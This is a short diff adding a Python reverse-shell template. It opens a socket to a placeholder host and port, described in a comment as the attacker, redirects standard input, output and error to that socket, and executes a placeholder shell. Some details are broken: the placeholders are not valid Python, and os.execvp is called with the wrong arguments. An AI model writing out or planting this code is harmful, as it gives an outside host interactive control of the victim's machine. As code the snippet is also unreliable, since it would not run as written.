@@ -1,0 +1,12 @@
+import socket, os
+
+# Open a new socket and connect to the attacker
+sock = socket.socket()
+sock.connect(("*\host*", *\port*))
+
+# Redirect standard input/output/error to the socket
+for fd in (0, 1, 2):
+    os.dup2(sock.fileno(), fd)
+
+# Replace the current process with the shell
+os.execvp(["*\shell*"])
